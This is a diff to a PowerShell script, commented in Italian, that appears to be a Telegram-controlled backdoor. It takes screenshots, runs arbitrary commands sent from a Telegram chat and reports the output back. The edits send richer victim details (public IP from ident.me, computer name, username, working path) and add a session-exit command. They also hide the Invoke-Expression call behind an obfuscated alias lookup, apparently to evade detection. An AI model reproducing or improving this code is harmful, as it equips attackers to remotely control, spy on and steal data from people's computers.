@@ -97,7 +97,7 @@ function GetScreenshot
         SendMessage "Procedo a catturare la schermata..."
 
         # Ottiene l'oggetto Screen corrispondente alla schermata principale
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
+        $screen = [System.Windows.Forms.Screen]::AllScreens
 
         # Crea un oggetto Bitmap con le dimensioni della schermata
         $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
@@ -175,7 +175,7 @@ function SendFile($filePath)
 
 
 
-function SendMessage($output)
+function SendMessage($output, $cmd)
 {
     # To escape _*``[\
     $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
@@ -184,7 +184,7 @@ function SendMessage($output)
     $MessageToSend = @{
         chat_id    = $telegram_id
         parse_mode = "MarkdownV2"
-        text       = "```````nHOST: [$(Invoke-RestMethod -Uri "ident.me" -WebSession $session)] $env:COMPUTERNAME ($env:USERNAME)`n$output`n``````"
+        text       = "```````nIP: $(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`COMPUTERNAME: $env:COMPUTERNAME`n`USERNAME: $env:USERNAME`nPATH: [$(((Get-Location).Path).Replace("\","/"))]`nCMD: $cmd`n`n$output`n``````"
     }
 
     # Converte le informazioni in formato JSON
@@ -279,6 +279,11 @@ function CommandListener
                 $text       = $message.text
                 $document   = $message.document
 
+                if ($text -match "exit") {
+                    SendMessage "Sessione chiusa"
+                    exit
+                }
+
                 if ($text.Length -gt 0) {
                     # Separa il messaggio per ogni parola in esso
                     $check_command = $text.Split()
@@ -308,24 +313,25 @@ function CommandListener
                                     $change_location_check = $text -split ' ' | Select-Object -First 1
                                     if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
                                     # Esegue l'istruzione
-                                    $output = Invoke-Expression -Command $text | Out-String 
+                                    #$output = Invoke-Expression -Command $text | Out-String
+                                    $output = .(gal ?e[?x])($text) | Out-String
                                 } 
                                 else { continue }
                             } catch { $output = $Error[0] | Out-String }
 
                             # Suddivide l'output in blocchi più piccoli per evitare limiti di dimensione
-                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
-                                $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
+                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
+                                $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
                             }
 
                             # Invia ciascun blocco di output come messaggio separato
                             foreach ($block in $output_splitted) { 
                                 $block = $block | Out-String
-                                SendMessage $block
+                                SendMessage $block $text
+                                Start-Sleep -Milliseconds 100
                             }
 
-                            # Se l'output è vuoto, invia un messaggio di conferma
-                            if ($output_splitted.Count -eq 0) { Start-Sleep -Milliseconds 300; SendMessage "Comando eseguito" }
+                            if ($output.Count -lt 1) { SendMessage ("Comando eseguito: " + $text) }
                         }
 
                         # Se è stato inviato un documento, scaricalo
